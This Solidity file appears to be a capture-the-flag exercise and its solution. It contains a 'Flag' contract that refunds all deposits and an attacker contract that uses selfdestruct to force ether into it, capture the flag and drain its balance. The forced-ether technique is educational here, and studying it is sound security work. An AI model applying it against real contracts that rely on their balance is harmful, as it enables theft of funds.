pragma solidity 0.4.24;

contract Flag {
    mapping (address => bool) public captured;

    event LogSneakedUpOn(address indexed who, uint howMuch);
    event LogCaptured(address indexed who, bytes32 braggingRights);

    constructor() public {
    }

    function sneakUpOn() public payable {
        emit LogSneakedUpOn(msg.sender, msg.value);
        msg.sender.transfer(msg.value);
    }

    function capture(bytes32 braggingRights) public {
        require(address(this).balance > 0);
        captured[msg.sender] = true;
        emit LogCaptured(msg.sender, braggingRights);
        msg.sender.transfer(address(this).balance);
    }
}

contract Conquistador {
    function() public payable {
    }

    function capture(Flag flag, bytes32 bragger) public payable {
        (new ScapeGoat).value(msg.value)(flag);

        uint oldBalance = address(this).balance;

        flag.capture(bragger);

        require(address(this).balance == oldBalance + msg.value);
        require(flag.captured(this) == true);
    }
}

contract ScapeGoat {
    constructor(address flag) public payable {
        selfdestruct(flag);
    }
}
